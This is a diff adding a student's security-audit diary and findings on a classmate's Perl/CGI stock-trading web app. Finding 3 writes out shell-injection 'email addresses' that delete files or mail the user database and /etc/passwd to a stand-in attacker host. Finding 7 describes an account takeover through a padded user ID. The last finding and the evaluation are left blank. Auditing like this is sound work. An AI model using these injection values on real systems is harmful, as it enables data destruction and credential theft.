@@ -1,0 +1,65 @@
+Benny Tsai
+benny.tsai@gmail.com
+600.443
+Assignment 1 - Part II
+
+*** Confessions of a Neophyte Auditer ***
+
+Tuesday, March 1st: Got my CD from Lucas.  Saw that the author was Jason Jankoski, which was not a name i was familiar with, but the grapevine has it that Jason worked at Ft. Meade with the NSA(!).  Scared out of my wits, i decided to concentrate on the upcoming midterm in Avi's class, and worry about this project after that.
+
+Friday, March 4th: Finally decided to open the dreaded vanilla envelope and have a look at Jason's code.  Turns out that my computer did not want to read his CD; both my DVD and CD drives were convinced the CD was blank.  Emailed the TA's to see what i should do.  Took the night off and went to see Ong-Bak, featuring Muay Thai artist Tony Jaa.  Best martial arts movie i've ever seen, easily besting the recent (over-CGI-ed and over-wire-worked) movies from Jackie Chan and Jet Li, even almost surpassing the quality of Bruce Lee's work during his prime.
+
+Saturday, March 5th: Got impatient and panicky, so i googled for Lucas' email address and emailed him.  Received a response in just an hour or so, suggesting that i get in touch with Jason, and supplying Jason's email address.  Shortly after i emailed Jason, both Lucas and Jason emailed me Jason's code.  I must remember to thank them both for their helpfulness.  Being paranoid, i diffed the code to make sure they were the same.  They were.  I poked around a bit, glanced over the files, then i gave in to laziness and played Deus Ex - Invisible War all night.
+
+Sunday, March 6th: Time to work.  I began by examining the HTML files, primarily to see which CGI files are invoked where.  Found some oddities in the HTML code (see Finding 1).  I didn't find anything else suspicious in the HTML files, so i decided to move on for now, maybe return to them later if i have time.  Looked at readme.txt next.  Here, i discovered a problem in the way file permissions are set (see Finding 2).  Then, after reading over SystemOverview.txt to glean the interface's flow, i decided that a good CGI file to start with is register.cgi.  Here i found a definite security problem (see Finding 3).  Spent the rest of the night recording my findings thus far.
+
+Tuesday, March 8th: Started poring over port.cgi in detail.  Found what looks like simple programming errors (see Findings 4 and 5).  While reviewing buy.cgi and sell.cgi (found a small logic error; see Finding 6), i realized that this program has a vulnerability almost identical to the backdoor i put into my own program (see Finding 7).  I can't believe it took me this long to realize that!  Also found an oddity in pageWriter.pl (see Finding 8).
+
+Thursday, Marth 10th: Came home from class with an urge to take another crack at the code to see what i could find.  After some experimenting, i thought of another way to exploit the lack of validation on user ID's (see Finding 9).  Feeling satisfied, i decided it was time to wrap things up and polish the write-up for submission.
+
+*** Findings ***
+
+1.	The HTML files, built by Yahoo SiteBuilder, make really weird use of column widths, table cell widths, table cell heights, and table cell column spans.  Especially suspicious is the comment that this is done as a "workaround for IE table layout bug."  This is exactly the sort of thing i would put in to cover my tracks.  The table layout in each HTML file begins with a huge number of column specifications.  Interestingly, in all of them, the first column always has width 135, and the last two columns always have widths 121 and 1.  I thought perhaps these weird dimension specifications are being used to encode information or perhaps even executable code.  However, index.html has no corresponding cgi file, which i expect would be needed to parse these dimesion specifications.  Also, in the CGI files i reviewed i didn't find any code that parses anything other than form variables from the HTML pages.  Some googling turned up a SiteBuilder forum entry where a (presumably non-malicious) user posted some code for others to re-use, which also exhibited weird use of dimension specifications.  That user was not blasted for writing code containing a backdoor.  So i'm chalking this one up as a SiteBuilder idiosyncracy.
+
+2.	The readme.txt states that the files pf.dat and userlist both need to be given read and write privileges "across the board," because otherwise "the web site will not be able to retain user information."  If we interpret this as saying that the two files need to be given 777 permissions, this creates a security problem!  Pf.dat stores portfolio data for all users, and userlist stores password (in the clear) for all users.  With all read permissions enabled, anyone can gain access to this information by simply navigating to the files via a web browser.  Worse still, with all write permissions enabled, anyone can modify them!  Now, i've only tested this on my barley account; perhaps in a different environment these important files are not exposed to the entire world, even with 777 permissions.  Nonetheless, Jason explicitly stating that we must give these files 777 permissions (if i'm interpreting the instructions correctly) definitely raises a red flag.
+
+3.	In register.cgi, if registration is successful (meaning only that the user is not trying to register an already-taken user name), one of the steps taken is emailing the user a confirmation, sent to the email address provided in the registration form; this is performed by the following chunk of code:
+
+	open(SM, "|/usr/sbin/sendmail -f customerService\@acme.brokerage.com $email") || die("Cannot send mail");
+	print SM "To: $mail\n";
+	print SM "From: customerService\@acme.com\n";
+	print SM "Subject: Account\n";
+	print SM "Your account has been approved. \n\t Username: $userid \n\t Password: $pass\n";
+	close(SM);
+	
+	The $email variable in the first line is provided by the following line of code:
+	
+	$email = $query->param('email');
+	
+	The only verification done on the email address is ensuring that it's not an empty string.  No filtering for metacharacters is done.  So one can do some very evil things by typing in the right "email address."  For example, suppose an attacker pass in "nobody@nowhere.com; rm * -rf;".  Then the open() command will evaluate the following command:
+	
+	/usr/sbin/sendmail -f customerService\@acme.brokerage.com nobody@nowhere.com; rm * -rf
+	
+	Fantastic.  The attacker just deleted everything in the directory, such as all the scripts, plus all the user information, since pf.dat and userlist are stored with the scripts.  Or how about this: "nobody@nowhere.com;mail badguys@hell.org<pf.dat;mail badguys@hell.org<userlist;"  Now the bad guy has access to all user info!  Better still, think about what happens with this email:"nobody@nowhere.com;mail badguys@hell.org</etc/passwd;"  Sweet!  The bad guy now has the system password file, allowing him to carry out password cracking attacks and other such naughtiness.
+	
+	The root of the problem is that no filtering or validation is done whatsoever on the email address (making sure it's not an empty string doesn't count!).  So an attacker can execute arbitrary system commands via the registration interface.  He basically owns any system this interface is installed on.
+
+4.	In port.cgi there's an else clause that gets triggered if the portfolio form is submitted without any form parameters being filled in.  This clause calls function printEntry, which doesn't actually exist.  I think this is just a programming error; i certainly mess up like this all the time.
+
+5.	The same else clause mentioned in Finding 4 calls function set_initial_values, which sets $id and $password to the id and password passed in by the form.  But the clause only gets triggered if nothing was passed in, so there's no id or password passed in.  Funky.
+
+6.	Small logic error; there doesn't seem to be any input checking done on the quantity of stocks bought or sold.  So the user can buy and sell negative shares of stock.  But since the interface doesn't track the amount of money the user has, this doesn't seem to really impact anything, other than the fact that you can use the buy interface to sell and the sell interface to buy.
+
+7.	Because of the way user information is stored in flat text file databases, an attacker can gain control of an existing, legitimate account by registering a new account with a carefully crafted user ID.  I found this only because this is the backdoor i built into my own program.  Is this just a coincidence, or did the TA's plan it this way?  Only time will tell.  The following example will hopefully clarify how the attack can be carried out.
+
+	Suppose we have a legitimate account with user ID J_Jankoski.  I'm an evil attacker that somehow learned about the name of this account, through phishing or some other method.  I can take control of J_Jankoski's account by registering a new account with first name J and last name "Jankoski ".  Note the extra space at the end.  The program will conjoin the first and last names to create the new user ID "J_Jankoski ".  It checks to see if this user ID is already used; because of the extra space, the new user ID will not match the existing "J_Jankoski" user ID.  So the program goes ahead and adds my new account, with my password.
+
+	The program does authentication by iterating through each line of the userlist file, and extracts user ID and password from each line by splitting on space characters.  So, when it processes the line added by my new account, it will extract "J_Jankoski" as the user ID, with the space removed by the splitting.  I've basically added a second valid password to the J_Jankoski account.  Now I can buy and sell stock as J_Jankoski!
+	
+	The catch is that I cannot view J_Jankoski's portfolio; because due to the way portfolio data is retrieved, the program will only display the portfolio associated with my new bogus account whenever user ID J_Jankoski is used.  So, not only am I unable to view J_Jankoski's portfolio, it should be obvious to the actual J_Jankoski that something is wrong because he cannot view his portfolio either.  But even if he realizes something is wrong, nothing short of canceling his account will stop me from trading stocks under his name.
+
+8.	In pageWriter.pl, at the end of the printBuyEnd function (the last function), the very last line is "1;".  I thought perhaps this did some evil thing, but further investigation dissuaded me from that idea.  The function doesn't take in any arguments as called from buy.cgi (and i didn't see this function called from anywhere else), so i don't see how it can get any information to leak.  Also, i wrote some test scripts with a 1 at the end of functions, and it didn't seem to do anything.  So it was probably just a typo, albeit an improbable and suspicious-looking one (since none of the symbols around the 1 key on the keyboard has any business near the end of a function declaration).
+
+9.	
+
+*** Evaulation ***
